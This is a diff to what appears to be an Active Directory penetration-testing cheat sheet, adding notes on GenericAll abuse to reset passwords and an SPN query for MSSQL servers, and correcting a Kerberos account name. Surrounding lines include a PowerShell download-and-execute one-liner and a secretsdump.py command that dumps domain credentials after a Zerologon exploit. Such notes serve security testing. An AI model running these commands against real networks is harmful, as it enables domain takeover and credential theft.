@@ -113,6 +113,13 @@ powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http:
 File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Abusing GenericAll access rights
+
+This gives you full control of the targeted object.
+Enumerate all domain users that our current account has GenericAll rights to.
+This would allow you to change the password on any user found, without the knowledge of the old password.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Domain Controller (DC)
 
 nbtstat -a <target IP>
@@ -148,7 +155,7 @@ to access a particular service.
 
 A user starts the communication process for a service request to a server with the service they want to access.
 Every DC runs a Kerberos Distribution Center (KDC) service that processes all requests for Kerberos tickets.
-The KBRTGT account acts as a service account for the KDC.
+The krbtgt account acts as a service account for the KDC.
 It contains three parts: Database, Authentication Server (AS), and Ticket Granting Server (TGS).
 The AS verifies client authentication. If the logged user is authenticated successfully the AS issues a ticket called TGT.
 Ticket Granting Ticket (TGT) confirms to other servers that user has been authenticated.
@@ -172,6 +179,9 @@ Leverages the certificate-based authentication in Active Directory enabled by de
 A forged TGS ticket for a specific service. TGS tickets are encrypted with the password hash for the service. If you can get the hash for a service
 account, you can create a TGS ticket for that service.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Show MSSQL servers
+setspn -T <domain> -Q MSSQLSvc/*
 
 # Show DCs
 dsquery server
@@ -336,3 +346,4 @@ chmod 755 *.py
 
 cd ../zerologon-virtualenv/bin/
 secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
+
